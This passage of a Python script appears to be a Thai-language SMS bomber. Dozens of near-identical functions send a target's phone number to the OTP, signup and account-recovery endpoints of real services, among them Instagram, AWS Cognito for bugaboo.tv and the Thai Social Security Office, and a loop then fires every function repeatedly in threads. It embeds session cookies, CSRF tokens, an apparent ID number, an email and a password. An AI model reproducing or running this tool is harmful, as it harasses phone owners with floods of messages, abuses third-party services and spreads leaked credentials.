	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game61():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game62():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game63():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game64():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game65():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game66():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game67():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game68():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone}
)
def game69():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
def game70():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game71():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game72():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game73():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game74():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game75():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game76():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game77():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game78():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game79():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game80():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game81():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone}
)

def game82():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game83():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game84():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game85():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game86():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game87():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game88():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game89():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game90():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone}
)
def game91():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
def game92():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game93():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game94():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game95():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game96():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game97():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game98():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game99():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game100():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game101():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game102():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game103():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone}
)

	

	
	
	
	
for i in range(amount):
	threading.Thread(target=game01).start()
	threading.Thread(target=game02).start()
	threading.Thread(target=game03).start()
	threading.Thread(target=game1).start()
	threading.Thread(target=game2).start()
	threading.Thread(target=game3).start()
	threading.Thread(target=game4).start()
	threading.Thread(target=game5).start()
	threading.Thread(target=game6).start()
	threading.Thread(target=game7).start()
	threading.Thread(target=game8).start()
	threading.Thread(target=game9).start()
	threading.Thread(target=game10).start()
	threading.Thread(target=game11).start()
	threading.Thread(target=game12).start()
	threading.Thread(target=game13).start()
	threading.Thread(target=game14).start()
	threading.Thread(target=game16).start()
	threading.Thread(target=game17).start()
	threading.Thread(target=game18).start()
	threading.Thread(target=game19).start()
	threading.Thread(target=game20).start()
	threading.Thread(target=game21).start()
	threading.Thread(target=game22).start()
	threading.Thread(target=game23).start()
	threading.Thread(target=game24).start()
	threading.Thread(target=game25).start()
	threading.Thread(target=game26).start()
	threading.Thread(target=game27).start()
	threading.Thread(target=game28).start()
	threading.Thread(target=game29).start()
	threading.Thread(target=game30).start()
	threading.Thread(target=game31).start()
	threading.Thread(target=game32).start()
	threading.Thread(target=game33).start()
	threading.Thread(target=game34).start()
	threading.Thread(target=game35).start()
	threading.Thread(target=game36).start()
	threading.Thread(target=game37).start()
	threading.Thread(target=game38).start()
	threading.Thread(target=game39).start()
	threading.Thread(target=game40).start()
	threading.Thread(target=game41).start()
	threading.Thread(target=game42).start()
	threading.Thread(target=game43).start()
	threading.Thread(target=game44).start()
	threading.Thread(target=game45).start()
	threading.Thread(target=game46).start()
	threading.Thread(target=game47).start()
	threading.Thread(target=game48).start()
	threading.Thread(target=game49).start()
	threading.Thread(target=game50).start()
	threading.Thread(target=game51).start()
	threading.Thread(target=game52).start()
	threading.Thread(target=game53).start()
	threading.Thread(target=game54).start()
	threading.Thread(target=game55).start()
	threading.Thread(target=game56).start()
	threading.Thread(target=game57).start()
	threading.Thread(target=game58).start()
	threading.Thread(target=game59).start()
	threading.Thread(target=game60).start()
	threading.Thread(target=game61).start()
	threading.Thread(target=game62).start()
	threading.Thread(target=game63).start()
	threading.Thread(target=game64).start()
	threading.Thread(target=game65).start()
	threading.Thread(target=game66).start()
	threading.Thread(target=game67).start()
	threading.Thread(target=game68).start()
	threading.Thread(target=game69).start()
	threading.Thread(target=game70).start()
	threading.Thread(target=game71).start()
	threading.Thread(target=game72).start()
	threading.Thread(target=game73).start()
	threading.Thread(target=game74).start()
	threading.Thread(target=game75).start()
	threading.Thread(target=game76).start()
	threading.Thread(target=game77).start()
	threading.Thread(target=game78).start()
	threading.Thread(target=game79).start()
	threading.Thread(target=game80).start()
	threading.Thread(target=game81).start()
	threading.Thread(target=game82).start()
	threading.Thread(target=game83).start()
	threading.Thread(target=game84).start()
	threading.Thread(target=game85).start()
	threading.Thread(target=game86).start()
	threading.Thread(target=game87).start()
	threading.Thread(target=game88).start()
	threading.Thread(target=game89).start()
	threading.Thread(target=game90).start()
	threading.Thread(target=game91).start()
	threading.Thread(target=game92).start()
	threading.Thread(target=game93).start()
	threading.Thread(target=game94).start()
	threading.Thread(target=game95).start()
	threading.Thread(target=game96).start()
	threading.Thread(target=game97).start()
	threading.Thread(target=game98).start()
	threading.Thread(target=game99).start()
	threading.Thread(target=game100).start()
	threading.Thread(target=game101).start()
	threading.Thread(target=game102).start()
	threading.Thread(target=game103).start()
